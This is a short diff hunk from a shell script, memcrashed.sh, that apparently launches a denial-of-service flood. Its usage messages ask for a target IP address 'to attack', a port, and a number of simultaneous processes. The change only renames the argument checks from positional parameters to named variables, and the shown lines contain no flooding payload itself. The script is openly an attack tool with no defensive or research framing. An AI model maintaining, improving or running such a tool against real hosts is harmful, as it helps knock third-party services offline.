@@ -40,17 +40,17 @@ if [ -z "$(which nping)" ]; then
       *)       echo "Error: Unknown distribution $distro"; exit 1 ;;
   esac
 else
-  if [ -z $1 ]; then
+  if [ -z $target ]; then
     echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
     TARGET is the IP address to attack, \
     PORT is the port to attack on the target, \
     and MULTIPLIER is the number of simultaneous process to run."
-  elif [ -z $2 ]; then
+  elif [ -z $port ]; then
     echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
     TARGET is the IP address to attack, \
     PORT is the port to attack on the target, \
     and MULTIPLIER is the number of simultaneous process to run."
-  elif [ -z $3 ]; then
+  elif [ -z $mul ]; then
     echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
     TARGET is the IP address to attack, \
     PORT is the port to attack on the target, \
